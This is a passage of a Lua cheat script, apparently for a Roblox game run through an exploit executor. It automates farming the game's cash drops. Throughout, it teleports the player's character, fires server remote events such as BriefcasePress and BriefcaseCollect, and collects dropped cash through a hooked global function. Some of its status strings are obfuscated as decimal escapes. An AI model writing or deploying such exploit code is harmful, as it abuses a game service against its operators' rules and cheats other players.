			game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Drop.PrimaryPart.CFrame
				+ Vector3.new(0, 2.5, 0)
			game:GetService("Workspace").Drop.BriefcasePress:FireServer()
			game:GetService("Workspace").Drop.BriefcaseCollect:FireServer()
			task.wait()
		until not game:GetService("Workspace"):FindFirstChild("Drop")
			or game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
			or game:GetService("Workspace"):FindFirstChild("Drop"):FindFirstChild("Particles").Transparency == 1
		task.wait(0.3)
		local DroppedCash = workspace.DroppedCash:GetChildren()
		local Needed = DroppedCash
		for _, v in pairs(DroppedCash) do
			if
				(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - v.PrimaryPart.Position).Magnitude
				> 25
			then
				table.remove(Needed, table.find(Needed, v))
			end
		end
		for i, v in pairs(DroppedCash) do
			if not _G.COLLECT_CASH_FUNCTION then
				GetCollectCashFunction()
			end
			if not _G.COLLECT_CASH_FUNCTION then
				sayMessage(
					"\85\110\97\98\108\101\32\116\111\32\103\101\116\32\99\114\105\116\105\99\97\108\32\102\117\110\99\116\105\111\110\32\102\111\114\32\99\111\108\108\101\99\116\105\110\103\32\99\97\115\104\44\32\84\101\114\109\105\110\97\116\105\110\103",
					Color3.fromRGB(11, 179, 221),
					""
				)
				break
			end
			sayMessage(
				"\67\111\108\108\101\99\116\105\110\103\32\67\97\115\104 (" .. i .. "/" .. #DroppedCash .. ")",
				Color3.fromRGB(11, 179, 221),
				""
			)
			pcall(function()
				_G.COLLECT_CASH_FUNCTION(v, true)
			end)
		end
		DroppedCash = workspace.DroppedCash:GetChildren()
		Needed = DroppedCash
		for _, v in pairs(DroppedCash) do
			if
				(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - v.PrimaryPart.Position).Magnitude
				> 35
			then
				table.remove(Needed, table.find(Needed, v))
			end
		end
		task.wait(2.8)
		repeat
			task.wait(0.5)
		until not _G.OpeningSafes
		--[[for i = 1, 4 do
			if #Needed <= 0 then
				break
			end
			sayMessage("Retrying...", Color3.fromRGB(11, 179, 221), "")
			for i, v in pairs(Needed) do
				if not _G.COLLECT_CASH_FUNCTION then
					GetCollectCashFunction()
				end
				if not _G.COLLECT_CASH_FUNCTION then
					--rconsoleerr("Unable to get critical function for collecting cash, Terminated")
					--error("Unable to get critical function for collecting cash, Terminated")
					sayMessage(
						"Unable to get critical function for collecting cash, Terminating",
						Color3.fromRGB(11, 179, 221),
						""
					)
					break
				end
				sayMessage("Collecting Cash (" .. i .. "/" .. #Needed .. ")", Color3.fromRGB(11, 179, 221), "")
				if
					not pcall(function()
						game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = v.PrimaryPart.CFrame
							+ Vector3.new(0, 5, 0)
						task.wait(0.2)
						pcall(function()
							_G.COLLECT_CASH_FUNCTION(v, true)
						end)
					end)
				then
					sayMessage(
						"Failed to pickup cash (" .. i .. "/" .. #Needed .. ")",
						Color3.fromRGB(11, 179, 221),
						""
					)
				end
			end
			DroppedCash = workspace.DroppedCash:GetChildren()
			Needed = DroppedCash
			for _, v in pairs(DroppedCash) do
				if
					(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - v.PrimaryPart.Position).Magnitude
					> 50
				then
					table.remove(Needed, table.find(Needed, v))
				end
			end
			task.wait(1)
		end]]
	end
end

task.delay(120, function()
	Change()
end)
game:GetService("Workspace").ChildAdded:Connect(Loop)
for _, v in pairs(workspace:GetChildren()) do
	Loop(v, true)
end
Change()	
